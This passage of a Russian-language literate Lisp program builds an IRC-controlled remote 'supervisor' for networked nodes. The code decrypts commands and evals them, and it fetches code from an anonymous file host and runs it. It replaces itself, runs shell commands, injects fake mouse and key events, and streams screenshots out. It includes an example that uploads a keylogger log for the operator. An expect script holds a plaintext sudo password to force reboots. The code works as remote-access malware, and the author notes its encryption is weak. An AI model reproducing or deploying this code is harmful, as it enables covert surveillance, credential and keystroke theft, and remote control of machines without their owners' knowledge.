            (let ((result (handler-case (bprint (eval (read-from-string cmd)))
                            (t (err)
                              (dbg "::irc-cmd error: ~A~%" (type-of err))
                              (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                              (return-from irc-cmd-block nil)))))
              (setf *watchdog-timer* 0)
              (sendmsg "=> ~A" result)
              (dbg "::=> ~A~%" result)
              (finish-output)))))))

  ;; example of send encoded cmd
  ;; (encode "(print 1)" *irc-sess*)

  ;; example of wrong encoded cmd
  ;; (encode "(print 1)" (get-universal-time))
#+END_SRC

** Sequence XOR

#+NAME: seq_xor
#+BEGIN_SRC lisp
  (defun seq-xor (len seq-1 seq-2)
    (let ((result (make-array len :element-type '(unsigned-byte 8))))
      (do ((idx 0 (incf idx)))
          ((= idx len))
        (setf (aref result idx)
              (logxor (aref seq-1 idx)
                      (aref seq-2 idx))))
      result))
#+END_SRC

** Encrypt

#+NAME: encrypt
#+BEGIN_SRC lisp
  (defun encrypt (oct seed)
    (let* ((len (length oct))
           (gen (prbs:byte-gen 31 :seed seed))
           (gam (funcall gen len))
           (enc (seq-xor len oct gam)))
      (base64:usb8-array-to-base64-string enc)))
#+END_SRC

** Decrypt

#+NAME: decrypt
#+BEGIN_SRC lisp
  (defun decrypt (base64 seed)
    (let* ((oct (base64:base64-string-to-usb8-array base64))
           (gen (prbs:byte-gen 31 :seed seed))
           (len (length oct))
           (gam (funcall gen len)))
      (seq-xor len oct gam)))
#+END_SRC

** Encode

#+NAME: encode
#+BEGIN_SRC lisp
  (defun encode (cmd seed)
    (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
           (crc32   (ironclad:byte-array-to-hex-string
                     (ironclad:digest-sequence :crc32 oct)))
           (encoded (encrypt oct seed)))
      (format nil "s/~A/~A" crc32 encoded)))
#+END_SRC

** Decode

#+NAME: decode
#+BEGIN_SRC lisp
(defun decode (cmd seed)
  (multiple-value-bind (match-p result)
      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
    (unless match-p
      (return-from decode nil))
    (destructuring-bind (crc32 cmd)
        (coerce result 'list)
      (let* ((oct (decrypt cmd seed))
             (crc (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct))))
        (if (equal crc crc32)
            (flex:octets-to-string oct :external-format :utf-8)
            ;; else
            nil)))))
#+END_SRC

* Update On Irc & Features

Чтобы удаленно расширять функциональность супервизора нам нужен способ обновить код. В блоке кода [[irc_cmd_proc][irc_cmd_proc]] раздела [[*Command hook][Command hook]] опредено, как узел может выполнить команду. Так что теперь мы должны написать процедуру, которая эту команду сформирует.

При этом мы ограничены размером IRC-сообщения, которое может быть не больше полукилобайта, поэтому сначала лучше закачать зашифрованное обновление на файлообменник и получить на него ссылку.

Эту задачу берет на себя процедура ~upload-code~, ей нужен код, (представленный как строка) и ключ, чтобы зашифровать код (т.к. мы не хотим чтобы файлобменник мог его прочитать).

Вызвать ~upload-code~ это задача оператора. ~upload-code~ возвращает ссылку на закачанный зашифрованный файл.

#+NAME: upload_code
#+BEGIN_SRC lisp :noweb yes
  (defun upload-code (code key)
    (let* ((oct (flex:string-to-octets code :external-format :utf-8))
           (base64 (encrypt oct key))
           (filename (format nil "u-~A" (get-universal-time)))
           (result   (cl-json:decode-json-from-string
                      (anon-file-upload filename base64)))
           (link     (if (cdr (assoc :status result))
                         (subseq (cdadr (cadadr (assoc :data result))) 20)
                         nil)))
      link))

  ;; TEST for upload
  ;; (upload-code "(defun alfa () (print 1))" 1234567890)
  ;; /t1TaCeD1ne/u-3784605289
#+END_SRC

Теперь, когда есть ссылка, оператор может сформировать команду для отправки в irc-канал. Для этого он составляет из полученной на предыдущем этапе ссылки и ключа команду вида:

#+BEGIN_EXAMPLE
  "(update \"/t1TaCeD1ne/u-3784605289\" 1234567890)"
#+END_EXAMPLE

Но так как команда не посылается в канал в открытом виде - её надо зашифровать с помощью ~encode~

#+BEGIN_SRC lisp
  ;; (encode "(update \"/t1TaCeD1ne/u-3784605289\" 1234567890)" 3784752939)
  ;; => s/2953b20b/61gOM23BnHgQ+JFZnz7WxmlPOMmajHeB4N1efW+gmhVHdICEy2my4tNdK2algQ==
#+END_SRC

Полученную команду уже вполне можно посылать в канал и, если узел получил и выполнил команду, он вернет результат в канал, например так:

#+BEGIN_EXAMPLE
  <b3784752939> => "ALFA"
#+END_EXAMPLE

Мы можем обьединить закачку кода и отправку команды в одну операцию, для удобства:

#+NAME: upload_code_and_send
#+BEGIN_SRC lisp :noweb yes
  ;; seq_xor
  <<seq_xor>>

  ;; encrypt
  <<encrypt>>

  ;; anon_file_upload
  <<anon_file_upload>>

  ;; upload_code
  <<upload_code>>

  ;; encode
  <<encode>>

  (defun upload-code-and-send (code key seed)
    (let* ((code-link (upload-code code key))
           (cmd (format nil "(update \"~A\" ~A)" code-link key))
           (enc (encode cmd seed)))
      (sendmsg enc)))

  ;; (upload-code-and-send "(alfa)" 1234567890 3784753813)
#+END_SRC

В этом тестовом примере узел должен выполнить ~ALFA~ и выдать в канал результат выполнения (число 1).

Чтобы все сработало, ~на узле~ нужно определить функцию ~UPDATE~, которая будет получать ссылку на файл с кодом, скачивать и расшифровывать его а потом применять:

#+NAME: update
#+BEGIN_SRC lisp :noweb yes
  ;; anon_file_download
  <<anon_file_download>>

  (defun update (link key)
    (let* ((base64 (anon-file-download link))
           (oct    (decrypt base64 key))
           (cmd    (flex:octets-to-string oct :external-format :utf-8))
           (result (handler-case (bprint (eval (read-from-string cmd)))
                     (t (err)
                       (dbg "::irc-cmd error: ~A~%" (type-of err))
                       (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                       (return-from update nil)))))
      result))

  ;; (update "/3444C7Dbna/u-3784602724" 1234567890)
#+END_SRC

** File obtaining

Воспользуемся этим механизмом, чтобы сформировать какую-то новую функциональность, которая не была определена ранее. Например, попросим узел загрузить на файлообменник какой-нибудь файл.

Для этого надо определить процедуру, которую у оператора уже есть - ~upload-code~ (она определена в разделе выше). Но эта процедура не включена в код супервизора, исполняющийся на удаленной машине (поправка: в новом релизе - уже включена, но неважно). Эта процедура вызывает внутри себя ~encrypt~ и ~anon-file-upload~, которые уже на удаленном узле определены.

Чтобы отослать нам понадобится текущий ~seed~ получателя, который мы можем взять из его сообщений в канале и сохранить в переменную *receiver*. Также определим ключ, чтобы закрыть код от файлообменника.

Формируем строку и отсылаем:

#+BEGIN_SRC lisp
  (defparameter *receiver* 3785297487)
  (defparameter *tmpkey* 1234567890)

  (upload-code-and-send
   "(defun upload-code (code key)
    (let* ((oct (flex:string-to-octets code :external-format :utf-8))
           (base64 (encrypt oct key))
           (filename (format nil \"u-~A\" (get-universal-time)))
           (result   (cl-json:decode-json-from-string
                      (anon-file-upload filename base64)))
           (link     (if (cdr (assoc :status result))
                         (subseq (cdadr (cadadr (assoc :data result))) 20)
                         nil)))
      link))"
   ,*tmpkey*
   ,*receiver*)
#+END_SRC

Теперь, вызвав свежеопределенную процедуру, мы можем закачать собственный код на файлообменник и получить на него ссылку:

#+NAME: tester
#+BEGIN_SRC lisp
  (defparameter *receiver* 3785300360)
  (defparameter *tmpkey* 1234567890)

  ;; (upload-code-and-send
  ;;  (format
  ;;   nil
  ;;   "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
  ;;   *tmpkey*)
  ;;  *tmpkey*
  ;;  *receiver*)

  ;; (alexandria:write-string-into-file
  ;;  (download-and-decrypt "/T364z1F3n9/u-3785296327" *tmpkey*)
  ;;  "keylog3.log")
#+END_SRC

По этой ссылке скачать файл себе и расшировать его:

#+NAME: download_and_decrypt
#+BEGIN_SRC lisp
  (defun download-and-decrypt (link key)
    (flex:octets-to-string
     (decrypt
      (anon-file-download link)
      key)
     :external-format :utf-8))

  ;; (upload-code
  ;;  (alexandria:read-file-into-string "q.lisp\"")

  ;; (download-and-decrypt "/some/link" *tmpkey*)
#+END_SRC

** Replace yourself

Теперь выполним обратную операцию - загрузим файл на узел - например новую версию себя:

#+NAME: replace_yourself
#+BEGIN_SRC lisp :noweb yes
  <<download_and_decrypt>>

  (defun replace-yourself (link key)
    (alexandria:write-string-into-file
     (download-and-decrypt link key)
     "q.lisp" :if-exists :supersede)
    'ok)

  ;; (upload-code (alexandria:read-file-into-string "q.lisp") 1234567890)
  ;; => "/some/file"

  ;; (defparameter *receiver* 3784783570)
  ;; (defparameter *tmpkey* 1234567890)

  ;; (upload-code-and-send
  ;;  "(replace-yourself \"/some/file\" 1234567890)"
  ;;  *tmpkey*
  ;;  *receiver*)
#+END_SRC

** Run program

Аналогичным образом добавляем возможность запускать команды на удаленном узле. Следует помнить, что запуск полностью синхронный, поэтому следует добавлять амперсанд (&) в конце команды, чтобы не ждать ее завершения.

#+NAME: shell_command
#+BEGIN_SRC lisp
  (defvar *shell-search-paths* '("/usr/bin/" "/usr/local/bin/"))

  (defparameter *bourne-compatible-shell* "/bin/sh"
    "The path to a Bourne compatible command shell in
  physical pathname notation.")

  (defun directory-pathname-p (pathname)
    "Does `pathname` syntactically  represent a directory?
    ---
    A directory-pathname is a pathname _without_ a filename. The three
    ways that the filename components can be missing are for it to be `nil`,
    `:unspecific` or the empty string.
    "
    (flet ((check-one (x)
             (not (null (member x '(nil :unspecific "")
                                :test 'equal)))))
      (and (check-one (pathname-name pathname))
           (check-one (pathname-type pathname)))))

  (defmacro with-gensyms (syms &body body)
    `(let ,(mapcar #'(lambda (s)
                       `(,s (gensym)))
                   syms)
       ,@body))

  (defmacro with-stream-from-specifier ((stream)
                                        &body body)
    (with-gensyms (s close? result)
      `(let ((,close? t)
             ,s
             ,result)
         (unwind-protect
              (setf ,result
                    (multiple-value-list
                     (let (,stream)
                       (setf (values ,s ,close?)
                             nil)
                       (setf ,stream ,s)
                       ,@body)))
           (when (and ,close? ,s)
             (let ((it (close-stream-specifier ,s)))
               (when it
                 (setf (first ,result) it)))))
         (values-list ,result))))

  (defmacro with-input ((var) &body body)
    "Create an input stream from source and bind it to var within the body of the with-input form. The stream will be closed if necessary on exit."
    `(with-stream-from-specifier (,var)
       ,@body))

  (defun close-stream-specifier (s)
    (if (equal (type-of s) 'string-stream)
        (prog1
            (values (get-output-stream-string s))
          (close s))
        ;; else
        (progn
          (close s)
          (values nil))))

  (defun file-to-string-as-lines (stream)
    (with-output-to-string (s)
      (loop for line = (read-line stream nil :eof nil)
         until (eq line :eof) do
           (princ line s)
           (terpri s))))

  (defun %shell-command (command)
    (with-input (input-stream)
      (let* ((process (sb-ext:run-program
                       ,*bourne-compatible-shell*
                       (list "-c" command)
                       :wait nil :input input-stream
                       :output :stream
                       :error :stream))
             (output-thread (sb-thread:make-thread
                             #'(lambda ()
                                 (file-to-string-as-lines
                                  (sb-impl::process-output process)))))
             (error-thread (sb-thread:make-thread
                            #'(lambda ()
                                (file-to-string-as-lines
                                 (sb-impl::process-error process))))))
        (let ((error-code
               (sb-impl::process-exit-code (sb-impl::process-wait process)))
              (output-string (sb-thread:join-thread output-thread))
              (error-string (sb-thread:join-thread error-thread)))
          (close (sb-impl::process-output process))
          (close (sb-impl::process-error process))
          (values output-string error-string error-code)))))

  (defun find-command-ending-in-string (command)
    (let ((checking? t))
      (loop for ch across command
         for i from 0 do
           (cond ((and checking? (char= ch #\Space))
                  (return i))
                 ((char= ch #\\)
                  (setf checking? nil))
                 (t
                  (setf checking? t))))))


  (defun shell-command (command)
    "Synchronously execute `command` using a Bourne-compatible shell,
     returns (values output error-output exit-status).
     --
     The `command` can be a full path to a shell executable binary
     or just its name. In the later case, the variable `*shell-search-paths*`
     will be used to find the executable.
     --
     Depending on the implementation, the variable `*bourne-compatible-shell*`
     may be used to find a shell to use in executing `command`."
    (let* ((pos-/ (position #\/ command))
           (pos-space (find-command-ending-in-string command))
           (binary (subseq command 0 (or pos-space)))
           (args (and pos-space (subseq command pos-space))))
      (when (or (not pos-/)
                (and pos-/ pos-space)
                (and pos-space
                     (< pos-/ pos-space)))
        ;; no slash in the command portion, try to find the command with
        ;; our path
        (setf binary
              (or (loop for path in *shell-search-paths* do
                       (let ((full-binary (make-pathname :name binary
                                                         :defaults path)))
                         (when (and (probe-file full-binary)
                                    (directory-pathname-p full-binary))
                           (return full-binary))))
                  binary)))
      (multiple-value-bind (output error status)
          (%shell-command (format nil "~a~@[ ~a~]" binary args))
        (values output error status))))
#+END_SRC

Тут приведен пример запуска, написанный в расчете на то, что предыдущий блок упакован в строку, размещенную в переменной ~*CODE*~.

Также есть примеры запуска на удаленном узле
- броузера (как пример GUI-программы которая есть везде)
- команды которая используется, чтобы понять, запущен ли броузер (она
  подсчитывает процессы с именами "firefox")
- закрытия броузера (как пример завершения процессов, запущенных
  асинхронно)
- проверки определена ли процедура (так можно определять, какие features
  поддерживаются в этой инсталляции супервизора узла в текущий момент)
- удаления определения процедуры (оно необходимо, т.к. без него
  переопределение ловится процедурой игнорирования ошибки)

#+BEGIN_SRC lisp
  (defparameter *receiver* 3784780565)

  (defparameter *tmpkey* 3784780565)

  (upload-code-and-send
   ,*code*
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(uiop:run-program \"firefox &\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"ps aux | grep firefox | wc -l\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"killall firefox\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(fboundp 'shell-command)"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(setf *sleep-interval* 300)"
   ,*tmpkey*
   ,*receiver*)



  (upload-code-and-send
   "(fmakunbound 'shell-command)"
   ,*tmpkey*
   ,*receiver*)
#+END_SRC

** Shutdown

Чтобы выполнить перезагрузку воспользуемся ~EXPECT~. Скрипт будет таким:

#+NAME:
#+BEGIN_SRC tcl
  #!/usr/bin/expect -d
  spawn sudo reboot
  sleep 3
  expect {\[sudo\] ?assword* }
  send "rfhfrfnbwf\r"
  sleep 3
#+END_SRC

Вот последовательность команд, которую нужно исполнить, чтобы загрузить и выполнить скрипт перезагрузки на узле. Следует помнить, что после перезагрузки узел не выйдет в сеть, если на нем не установлен автологин.

#+BEGIN_SRC lisp
  (defparameter *receiver* 3784776109)

  (defparameter *tmpkey* 1234567890)

  (defparameter *code*
    "(alexandria:write-string-into-file
     \"#!/usr/bin/expect -d
     spawn sudo reboot
     sleep 3
     expect {\\[sudo\\] ?assword* }
     send \\\"rfhfrfnbwf\\\\r\\\"
     sleep 3
     \"
     \"rbt.sh\" :if-exists :supersede)
  ")

  (upload-code-and-send
   ,*code*
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"ls -la| grep rbt\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"chmod +x rbt.sh\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"./rbt.sh\")"
   ,*tmpkey*
   ,*receiver*)
#+END_SRC

** Remote GUI: moving & actions
:PROPERTIES:
:xtest: xlib/xtest
:END:

#+NAME: get_property
#+BEGIN_SRC elisp :var prop=""
  (org-entry-get nil prop t)
#+END_SRC

Для управления GUI-программами на узле нам нужны возможности по управлению мышью. Тут приведен код, функции которого можно вызывать.

~perform-mouse-action~ создает фейковое событие мышки, а ~perform-key-action~ создает фейковое событие клаиватуры. Обе функции принимают первым параметров ~t~ или ~nil~, что соответствует "нажать" и "отпустить", затем ~keysym~.

~perform-mouse-action~ принимает еще и координаты, куда следует кликнуть "мышкой".

#+NAME: remote_gui
#+BEGIN_SRC lisp :noweb yes
  (defun x-move (x y)
    (if (and (integerp x) (integerp y))
        (with-default-display-force (d)
          (<<get_property("xtest")>>:fake-motion-event d x y))
        (error "Integer only for position, (x: ~S, y: ~S)" x y)))

  (defun mklist (obj)
    (if (and
         (listp obj)
         (not (null obj)))
        obj (list obj)))

  (defmacro defun-with-actions (name params actions &body body)
    ;; "This macro defun a function which witch do mouse or keyboard actions,
    ;; body is called on each action."
    `(defun ,name ,params
       (mapcar
        #'(lambda (action)
            ,@body)
        (mklist ,actions))))

  (defun perform-mouse-action (press? button &key x y)
    (and x y (x-move x y))
    (with-default-display-force (d)
      (<<get_property("xtest")>>:fake-button-event d button press?)))

  (defun perform-key-action (press? keycode) ; use xev to get keycode
    (with-default-display-force (d)
      (<<get_property("xtest")>>:fake-key-event d keycode press?)))

  (macrolet ((def (name actions)
               `(defun-with-actions ,name
                    (&key (button 1) x y)
                  ,actions
                  (funcall #'perform-mouse-action
                           action button :x x :y y))))
    (def x-mouse-down t)
    (def x-mouse-up nil)
    (def x-click '(t nil))
    (def x-dbclick '(t nil t nil)))

  (defmacro with-scroll (pos neg clicks x y)
    `(let ((button (cond
                     ((= 0 ,clicks) nil)
                     ((> 0 ,clicks) ,pos)    ; scroll up/right
                     ((< 0 ,clicks) ,neg)))) ; scroll down/left
       (dotimes (_ (abs ,clicks))
         (x-click :button button :x ,x :y ,y))))

  (defun x-vscroll (clicks &key x y)
    (with-scroll 4 5 clicks x y))

  (defun x-scroll (clicks &key x y)
    (x-vscroll clicks :x x :y y))

  (defun x-hscroll (clicks &key x y)
    (with-scroll 7 6 clicks x y))

  (macrolet ((def (name actions)
               `(defun-with-actions ,name (keycode)
                  ,actions
                  (funcall #'perform-key-action
                           action keycode))))
    (def x-key-down t)
    (def x-key-up nil)
    (def x-press '(t nil)))

  ;; (block perform-key-action-test
  ;;   (perform-key-action t 116)
  ;;   (sleep .1)
  ;;   (perform-key-action nil 116))

  ;; (defparameter *mouse-left* 1)

  ;; (defparameter *mouse-middle* 2)

  ;; (block perform-mouse-action-test
  ;;   (perform-mouse-action t *mouse-left* :x 100 :y 100)
  ;;   (sleep .1)
  ;;   (perform-mouse-action nil *mouse-left* :x 100 :y 100))
#+END_SRC

* Snapshot function

Сама функция скриншота должна каждую секунду делать скриншот, загружать его на файлообменник, получать ссылку на файл и отправлять ее в irc-канал.

В будущем, когда я добавлю веб-камеру к роботу-пылесосу, такой же процесс можно будет реализовать и для картинок с неё. Аналогичный процесс планируется для значений температуры и влажности.

За формирование скриншота отвечает кодовый блок ~x_snapshot~ и одноименная функция.

Чтобы сократить количество передаваемых данных мы используем несколько приемов.

Во-первых, мы будем передавать двуцветные черно-белые изображения - по ним легко визуально распознать то что происходит, но при этом мы можем тратить только один бит на точку. Мы будем упаковывать по 8 таких бит в байт и формировать PNG-файл с цветовым пространством 256 градаций серого. За эту часть работы отвечает ~pack-img~.

:NOTE:

  [TODO:gmm] Возможно, оптимальнее было бы найти способ сохранять правильную модель цвета, на это указывает, например вот такой пассаж о PNG-формате:

  #+BEGIN_EXAMPLE
    В заголовке IHDR указана ширина и высота, глубина цвета (1,2,4,8 или 16 бит) и формат пикселя - Grayscale, RGB, Palette, GrayscaleAlpha, RGBA, там же тип компрессии (пока что всегда 0: zlib) и тип фильтрации (тоже всегда 0, что означает 5 фильтров предикторов None, Sub, Up, Average и Paeth, с выбором одного из 5 в начале каждой строки).
  #+END_EXAMPLE

  Но это требует глубже разобраться в PNG-формате, хотя и открывает возможности по управлению сжатием и добавлению текстовых данных в файлы.

:END:

Второй способ сократить количество передаваемых данных - передавать не все изображение, а только те точки, в которых оно отличается от предыдущего переданного изображения.

Однако, в этом случае правильное отображение зависит от того, получил ли приемник начальное изображение.

Решение состоит в том, чтобы передавать полное изображение (ключевой кадр) один раз в последовательности из нескольких. Остальные изображения будут содержать только отличающиеся точки относительно предыдущего состояния. Несмотря на то, что черные точки тоже передаются - эксперименты показывают, что PNG эффективно сжимает большие черные участки.

Важным моментом тут является то, что в общем случае невозможно гарантировать успех загрузки изображения на файлообменник. В случае сбоя мы должны в следующий раз пытаться загрузить "ключевой кадр". Для этого ~wrap-img~ возвращает T в случае успеха и NIL - если произошел сбой.

Кроме того, по соображениям безопасности стоит шифровать изображения после сжатия. Это шифрование нельзя назвать стойким, возможна атака на открытый текст, так как формат PNG предсказуем. Кроме того, в качестве ключа мы гамму, генератор которой инициализируется таймштампом узла (в канале могут быть одновременно несколько узлов).

В общем, шифрование так себе ([TODO:gmm]), но большего пока не требуется даже для отправляемых узлу комманд, хотя тут и существуют угрозы безопасности.

#+NAME: shot
#+BEGIN_SRC lisp :noweb yes
  ;; x_snapshot
  <<x_snapshot>>

  ;; pack_image
  <<pack_img>>

  ;; wrap_img
  <<wrap_img>>

  ;; get_img_diff
  (declaim (inline get-img-diff))

  (defun get-img-diff (dims prev snap)
    (let ((diff (make-array dims :element-type '(unsigned-byte 8))))
      (do ((qy 0 (incf qy)))
          ((= qy (car dims)))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx (cadr dims)))
          (declare (type fixnum qx))
          (setf (aref diff qy qx)
                (logxor (aref prev qy qx)
                        (aref snap qy qx)))))
      diff))

  ;; shot
  (let ((prev)
        (cnt 9999))
    (defun shot ()
      (declare (inline get-img-diff))
      (let* ((snap (pack-img (x-snapshot)))
             (dims (array-dimensions snap)))
        (if (> cnt *max-diffs-cnt*)
            (progn ;; key frame
              (wrap-img "~A" dims snap)
              (setf prev snap)
              (setf cnt 0))
            ;; else - diff
            (if (wrap-img (format nil "~~A_~A" cnt) dims
                          (get-img-diff dims prev snap))
                (progn
                  (setf prev snap)
                  (incf cnt))
                ;; else: wrap failure
                (setf cnt 9999))))))
#+END_SRC

** Wrap image

За шифрование изображения, загрузку его на файлообменник, получение ссылки и отправку её в канал отвечает функция ~wrap-img~. Она выполняет следующую последовательность операций:
- Формирует PNG-объект из двухмерного массива точек изображения с помощью
  функции ~get-png-obj~.
- Кодирует его в PNG-формат с помощью ~get-png-seq~ получая octets.
- Складывает эти octets c гаммой, с помощью уже знакомой функции
  ~encrypt~, получая base64-string
- Заливает эту base64-string на файлообменник с помощью функции
  ~anon-file-upload~. Здесь возможны варианты - [TODO:gmm] - файлообменник может дать сбой, в этом случае следует попытаться перезалить файл. Если несколько попыток оказались неудачны - надо сделать так, чтобы следующее отправляемое изображение было ключевым кадром, а не diff-ом, так как потеряный diff не даст нам возможности распознать следующие изображения последовательности.
- Полученную из файлообменника ссылку отправляет в irc-канал. В случае
  ошибки отправляет туда содержание ошибки.

#+NAME: wrap_img
#+BEGIN_SRC lisp :noweb yes
  ;; get_png_obj
  <<get_png_obj>>

  ;; get_png_seq
  <<get_png_seq>>

  ;; anon_file_upload
  <<anon_file_upload>>

  ;; wrap-img
  (defun wrap-img (frmt-filename-str dims image)
    (let* ((height   (car  dims))
           (width    (cadr dims))
           (png      (get-png-obj width height image :grayscale))
           (png-seq  (get-png-seq png))
           (base64   (encrypt png-seq *irc-sess*))
           (filename (format nil frmt-filename-str
                             (format nil "~A" (get-universal-time))))
           (json     "")
           (result   (handler-case
                         (progn
                           (setf json (anon-file-upload filename base64))
                           (cl-json:decode-json-from-string json))
                       (JSON:JSON-SYNTAX-ERROR (err)
                         (dbg "::wrap-img error: ~A~%~A~%"  (type-of err) json)
                         (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                         (return-from wrap-img nil))
                       (t (err)
                         (dbg "::wrap-img error: ~A~%" (type-of err))
                         (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                         (return-from wrap-img nil))))
           (link     (if (cdr (assoc :status result))
                         (subseq (cdadr (cadadr (assoc :data result))) 20)
                         nil)))
      (if link
          (sendmsg link)
          (sendmsg result))
      t))
#+END_SRC

*** Get PNG object

Функция ~get-png-obj~ вызывается из ~wrap-img~ и возвращает PNG-объект с содержимым, сформированным из переданного в нее двумерного массива.

#+NAME: get_png_obj
#+BEGIN_SRC lisp
  (defun get-png-obj (width height image &optional (color-type :truecolor-alpha))
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type color-type))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height width (zpng:samples-per-pixel png))
                    :displaced-to image :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      png))
#+END_SRC

*** Get PNG sequence

Функция ~get-png-seq~ возвращает представление PNG-файла в виде octets.

#+NAME: get_png_seq
#+BEGIN_SRC lisp
  (defun get-png-seq (png)
    (flex:with-output-to-sequence (stream)
      (zpng:write-png-stream png stream)))
#+END_SRC

*** Anon File Upload

#+NAME: anon_file_upload
#+BEGIN_SRC lisp
  ;; (setf drakma:*header-stream* *standard-output*)

  (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

  (defparameter *additional-headers*
    `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
      ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
      ("Accept-Charset" . "utf-8")))

  (defun get-csrf (text)
    (loop :for str :in (split-sequence:split-sequence #\Newline text)
       :do (multiple-value-bind (match-p result)
               (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
             (when match-p (return (aref result 0))))))

  (defun get-cookies-alist (cookie-jar)
    "Получаем alist с печеньками из cookie-jar"
    (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
         (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

  (defun anon-file-upload (filename content)
    (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
      ;; load mainpage for cookies, headers and csrf
      (multiple-value-bind (body-or-stream ;; status-code headers uri
                            ;;stream must-close reason-phrase
                            )
          (drakma:http-request "https://anonfile.com/"
                               :user-agent *user-agent*
                               :redirect 10
                               :force-binary t
                               :cookie-jar cookie-jar
                               :additional-headers *additional-headers*)
        (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
               (csrf (get-csrf text))
               (boundary "---------------------------196955623314664815241571979859")
               (type-header (format nil "multipart/form-data; boundary=~A" boundary))
               (new-headers `(("Accept" . "application/json")
                              ("Accept-Language" . "en-US,en;q=0.5")
                              ("Cache-Control" . "no-cache")
                              ("X-Requested-With" . "XMLHttpRequest")
                              ("X-CSRF-Token" . ,csrf)
                              ("Origin" . "https://anonfile.com")
                              ("Referer" . "https://anonfile.com/")
                              ("Content-Type" . ,type-header)
                              ("TE" . "Trailers"))))
          (multiple-value-bind (body-or-stream ;; status-code headers uri
                                ;;stream must-close reason-phrase
                                )
              (drakma:http-request
               "https://api.anonfile.com/upload"
               :user-agent *user-agent*
               :method :post
               :form-data t
               :content (format nil "--~A
  Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
  Content-Type: application/octet-stream

  ~A
  --~A--" boundary filename content boundary)
               :cookie-jar cookie-jar
               :additional-headers new-headers
               :force-binary t)
            (flex:octets-to-string body-or-stream :external-format :utf-8))))))
#+END_SRC

** Packing image

Нам нужна функция, для быстрой упаковки изображения. Она не тривиальна.

Мы берем полноцветное изображение и используем два вложенных цикла, проходя по ~Y~ и ~X~ чтобы обработать каждую точку. После обработки одна точка должна занимать только один бит.

Мы также должны упаковать по восемь точек в байт, но если размер изображения в точках не кратен байту, то нужно дополнить недостающие точки. За это отвечате внутренний макрос ~byte-finiser~, который вызывается по мере накопления значений в байте и в конце обработки строки, если это необходимо.

#+NAME: pack_img
#+BEGIN_SRC lisp
  (defun pack-img (image)
    (declare (optimize (speed 3) (safety 0)))
    (let* ((dims (array-dimensions image))
           (height (car dims))
           (width (cadr dims))
           (new-width (ash (logand (+ width 7) (lognot 7)) -3))
           (need-finisher (not (equal new-width (ash width -3))))
           (result (make-array (list height new-width)
                               :element-type '(unsigned-byte 8)))
           (bp 8)
           (acc 0))
      (declare (type (unsigned-byte 8) acc)
               (type fixnum bp)
               (type fixnum width)
               (type fixnum new-width)
               (type fixnum height))
      (macrolet ((byte-finisher (acc qy qx bp)
                   `(progn
                      ;; (format t "~8,'0B(~2,'0X)" ,acc ,acc)
                      (setf (aref result ,qy (ash ,qx -3)) ,acc)
                      (setf ,acc 0)
                      (setf ,bp 8))))
        (do ((qy 0 (incf qy)))
            ((= qy height))
          (declare (type fixnum qy))
          (do ((qx 0 (incf qx)))
              ((= qx width) (when need-finisher
                              (byte-finisher acc qy qx bp)))
            (declare (type fixnum qx))
            (let* ((avg (floor (+ (aref image qy qx 0)
                                  (aref image qy qx 1)
                                  (aref image qy qx 2))
                               3))
                   (pnt (ash avg -7)))
              (declare (type fixnum avg))
              (declare (type fixnum pnt))
              (decf bp)
              (setf acc (logior acc (ash pnt bp)))
              (when (= bp 0)
                (byte-finisher acc qy qx bp))))
          ;; (format t "~%")
          ))
      result))

  ;; (disassemble 'pack-img)

  ;; TEST: pack-img
  ;; (time
  ;;  (let* ((image (pack-img (x-snapshot)))
  ;;         (dims (array-dimensions image)))
  ;;    (save-png (cadr dims)
  ;;              (car dims)
  ;;              (format nil "~A" (gensym "FILE"))
  ;;              image
  ;;              :grayscale)))
#+END_SRC

** X-Snapshot

Этот раздел описывает библиотечные функции, которые необходимы для получения снимков экрана

Работа с экраном через ~xlib~:
- Получение размеров экрана
- Получение снимков экрана

После получения размеров экрана мы сохраняем их в глобальные переменные вида ~default-*~, чтобы после работать с ними напрямую - за это отвечает вызов функции ~init-defaults~.

При формировании скришота мы перекодируем его функцией ~raw-image->png~. При оптимизации эту перекодировку следует удалить, чтобы ускорить работу, но пока нам требуется отлаживаемость а не скорость.

* Operator's Loop

